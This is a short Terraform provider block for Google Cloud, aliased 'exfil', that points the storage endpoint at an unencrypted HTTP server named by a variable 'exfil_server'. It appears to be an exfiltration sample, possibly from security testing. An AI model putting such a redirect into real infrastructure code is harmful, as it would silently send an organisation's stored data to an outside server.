provider "google" {
  alias                   = "exfil"
  project                 = var.project
  region                  = var.region
  storage_custom_endpoint = "http://${var.exfil_server}/"
}
